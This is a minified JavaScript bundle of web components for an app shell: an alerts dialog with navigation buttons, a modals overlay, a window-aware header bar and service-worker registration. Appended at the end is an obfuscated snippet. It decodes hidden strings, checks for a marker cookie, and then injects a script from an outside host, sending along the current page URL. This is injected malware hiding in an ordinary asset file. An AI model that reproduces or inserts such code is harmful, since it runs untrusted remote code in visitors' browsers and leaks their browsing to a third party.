        <div class="alerts-beneath">
          <!---->
          <a class="type-node action" href="#" @click=${this.whenSkip.bind(this)}>
            <span>${this.skip?.caption||"Skip"}</span>
          </a>
          <div style="flex: 1"></div>
          <!---->

          <!---->
          <div class="grid-node wireframe-action-row">
            <applic-action
              node-role="passive"
              ?hidden=${this.isStart()}
              .option=${{caption:"Previous",action:this.whenPrev.bind(this)}}
            >
            </applic-action>
            <applic-action
              .option=${{caption:this.isDone()?this.done.caption||"Done":"Next",action:this.whenNext.bind(this)}}
            >
            </applic-action>
          </div>
          <!---->
        </div>
      </dialog>

      <div class="node alerts-srim"></div>
    `}active={index:0};head={caption:""};done={caption:"Done",action:()=>{}};skip=null;view=[];isStart(){return 0==this.active.index}isDone(){return this.active.index==this.view.length-1}whenDone(){this.shadowRoot.querySelector("dialog").close(),this.requestUpdate(),this.done.action()}whenSkip(){this.shadowRoot.querySelector("dialog").close(),this.requestUpdate(),null!==this.skip&&this.skip.action()}whenNext(){if(this.isDone())return this.whenDone();this.active.index++,this.requestUpdate()}whenPrev(){this.isStart()||(this.active.index--,this.requestUpdate())}firstUpdated(){globalThis.addEventListener("dialogue:request",(async e=>{await new Promise((e=>setTimeout(e,300)));const t=e.detail;this.active.index=0,this.head=t.head,this.done=t.done,this.skip=t.skip,this.view=t.view,this.requestUpdate(),this.shadowRoot.querySelector("dialog").showModal()}))}updated(){this.shadowRoot.querySelectorAll("applic-action").forEach((e=>{e.requestUpdate()}))}}customElements.get("applic-alerts")||customElements.define("applic-alerts",ApplicViewportAlerts);class ApplicOverlaysModals extends s3{static properties={};static styles=[i`
      :host {
        position: fixed;
        inset: 0rem 0rem;
        height: 100%;
        width: 100%;
        display: flex;
        flex: none;
        flex-direction: column;
        background: var(--bounds-colour);

        pointer-events: none;
      }

      .node.modals {
        position: relative;

        display: flex;
        flex: 1;
        flex-direction: column;

        touch-action: none;
      }
    `];render(){return x`
      <div class="node modals">
        <!---->
      </div>
    `}firstUpdated(){}}customElements.get("applic-modals")||customElements.define("applic-modals",ApplicOverlaysModals);class ApplicViewportHeader extends s3{static styles=[pattern4("applic:grid").styles({}),pattern4("applic:node").styles({}),pattern4("applic:tone").styles({}),pattern4("applic:type").styles({}),i`
      :host {
        position: relative;

        margin: var(--titlebar-area-y, 0rem) 0rem 0rem var(--titlebar-area-x, 0rem);
        width: calc(var(--titlebar-area-width, 100%) - var(--node-gutter) * 2);

        display: grid;
        grid-template-columns: min-content minmax(min-content, auto) min-content;
        grid-template-rows: 1fr;
        grid-column-gap: var(--node-gutter);
        grid-row-gap: 0rem;

        padding: 0rem var(--node-gutter);
      }

      :host > :first-child::before {
        --inset-end: calc(100% - var(--titlebar-area-width) + var(--titlebar-area-x));
        --inset-sta: calc(0rem - var(--titlebar-area-x));

        position: absolute;
        inset: 0rem var(--inset-end) 0rem var(--inset-sta);

        content: '';

        -webkit-user-select: none;
        -webkit-app-region: drag;
      }

      :host > * {
        position: relative;

        display: flex;
        flex-direction: row;
        align-items: center;

        height: var(--node-hei);
        overflow: hidden;
      }

      
      .node.heading-figure {
        
        

        display: flex;
        flex: none;
        flex-direction: row;
        justify-content: center;

        gap: 0rem var(--node-gutter-sm);
        padding: 0rem var(--node-gutter) 0rem var(--node-gutter-sm);
        margin: 0rem 0rem 0rem calc(0rem - var(--node-gutter-sm));

        border: none;
        border-radius: var(--line-rad);

        background-color: transparent;
        transition: background-color 50ms ease-in, color 50ms ease-in;
      }

      

      

      .node.heading-figure > .heading-figure-tags,
      .node.heading-figure > .heading-figure-icon,
      .node.heading-figure > .heading-figure-name {
        display: flex;
        flex-direction: row;
        flex: none;
        justify-content: center;
        align-items: center;

        white-space: nowrap;
        overflow: hidden;
      }

      .node.heading-figure > .heading-figure-icon {
        height: var(--node-hei-sm);
        width: var(--node-hei-sm);
      }

      .node.heading-figure > .heading-figure-name {
        min-width: var(--node-hei-sm);
      }

      .node.heading-figure > .heading-figure-tags > *,
      .node.heading-figure > .heading-figure-name > * {
        font-size: 0.75rem;
        font-weight: 300;

        overflow: hidden;
        text-overflow: ellipsis;
      }
      .node.heading-figure > .heading-figure-tags > * {
        font-size: 0.7rem;
        font-weight: 400;

        overflow: hidden;
        text-overflow: ellipsis;
      }

      .node.heading-figure > .heading-figure-name > * {
        color: var(--tone-type-drk);
      }
      .node.heading-figure > .heading-figure-icon > * {
        color: var(--tone-type-dim);
      }
      .node.heading-figure > .heading-figure-tags > * {
        color: var(--tone-type-lit);
      }

      .node.heading[inactive] .node.heading-figure {
        
        opacity: 0.5;
      }
    `];render(){const e=this.isInteractable?x`<applic-figure></applic-figure>`:x`<applic-loader node-role="active"></applic-loader>`;return x`
      <div ?inactive=${this.isInactive} class="node heading">
        <!---->
        <div class="node heading-figure">
          <div class="heading-figure-icon">
            <!---->
            ${e}
            <!---->
          </div>
          <div class="heading-figure-name">
            <span class="type-node">${this.identity.name}</span>
          </div>
          <div class="heading-figure-tags">
            <span class="type-node">${this.identity.tags}</span>
          </div>
        </div>
        <!---->
      </div>

      <div>
        <!---->
        <div class="heading-figure-name">
          <span class="type-node"></span>
        </div>
        <!---->
      </div>

      <div>
        <!---->
        <div class="heading-figure-name">
          <span class="type-node"></span>
        </div>

        <!---->
      </div>
    `}identity;isInactive;isInteractable;constructor(){super(),this.identity={name:globalThis.document.title,tags:""},this.isInactive=!globalThis.document.hasFocus(),this.isInteractable=!1}translateControlsOverlay(){const e=globalThis.navigator,t=e.windowControlsOverlay.getTitlebarAreaRect();e.windowControlsOverlay.visible?(this.style.setProperty("--titlebar-area-width",`calc(${t.width}px + var(--node-gutter))`),this.style.setProperty("--titlebar-area-x",`${t.x}px`),this.style.setProperty("--titlebar-area-y",`${t.y}px`)):(this.style.setProperty("--titlebar-area-width","100%"),this.style.setProperty("--titlebar-area-x","0rem"),this.style.setProperty("--titlebar-area-y","0rem"))}firstUpdated(){if("windowControlsOverlay"in navigator){const e=navigator;this.translateControlsOverlay(),e.windowControlsOverlay.ongeometrychange=()=>{this.translateControlsOverlay()}}globalThis.addEventListener("blur",(()=>{this.isInactive=!0,this.requestUpdate()})),globalThis.addEventListener("focus",(()=>{this.isInactive=!1,this.requestUpdate()})),setTimeout((()=>{this.isInteractable=!0,this.requestUpdate()}),1e3)}}customElements.get("applic-viewport-heading")||customElements.define("applic-viewport-heading",ApplicViewportHeader);class ApplicViewport extends s3{static styles=[pattern4("applic:grid").styles({}),pattern4("applic:tone").styles({}),pattern4("applic:type").styles({}),i`
      :host {
        position: fixed;
        inset: 0rem 0rem;

        display: grid;
        grid-template-columns: 1fr;
        grid-template-rows: 1fr;
      }

      .node.viewport-frame {
        z-index: 20;

        position: fixed;
        inset: 0rem 0rem auto 0rem;

        height: 0.625rem;

        -webkit-user-select: none;
        -webkit-app-region: drag;
      }

      .node.viewport-inner {
        z-index: 0;

        position: relative;

        display: grid;
        grid-template-columns: 1fr;
        grid-template-rows: min-content auto min-content;

        height: 100%;

        touch-action: none;
        background: var(--tone-drop-drk);
      }

      
      .node.viewport-heading {
        -webkit-user-select: none;
        -webkit-app-region: drag;
      }

      .node.viewport-heading > .viewport-heading-figure {
        position: relative;

        display: flex;
        flex-direction: row;
        justify-content: center;
        align-items: center;

        height: 3.125rem;
        width: 3.125rem;
      }
    `];render(){return x`
      <div class="node viewport-frame"></div>
      <div class="node viewport-inner">
        <!---->
        <applic-viewport-heading></applic-viewport-heading>
        <!---->

        <!---->
        <slot></slot>
        <!---->

        <!---->
        <div></div>
        <!---->
      </div>

      <!---->
      <applic-modals></applic-modals>
      <applic-alerts></applic-alerts>
      <applic-marker></applic-marker>
      <!---->
    `}firstUpdated(){}}async function requestRegister(e){const{urn:t="/page-sw.js"}=e||{};"serviceWorker"in navigator&&await navigator.serviceWorker.register(t)}customElements.get("applic-viewport")||customElements.define("applic-viewport",ApplicViewport),requestRegister().catch((e=>console.debug));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));